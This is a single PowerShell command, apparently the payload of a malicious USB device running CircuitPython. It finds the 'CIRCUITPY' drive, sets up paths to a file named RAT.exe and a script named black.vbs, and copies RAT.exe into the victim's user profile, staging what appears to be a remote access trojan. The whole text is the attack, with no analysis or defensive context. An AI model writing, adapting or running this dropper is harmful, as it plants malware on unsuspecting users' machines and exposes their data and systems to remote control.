powershell $raspletter=(Get-Volume -FileSystemLabel 'CIRCUITPY').DriveLetter; $raspunit="${raspletter}:\"; $rasprat="${raspunit}RAT.exe"; $raspvbs="${raspunit}black.vbs"; cd "${raspletter}:"; Copy-Item -path $rasprat -destination $env:USERPROFILE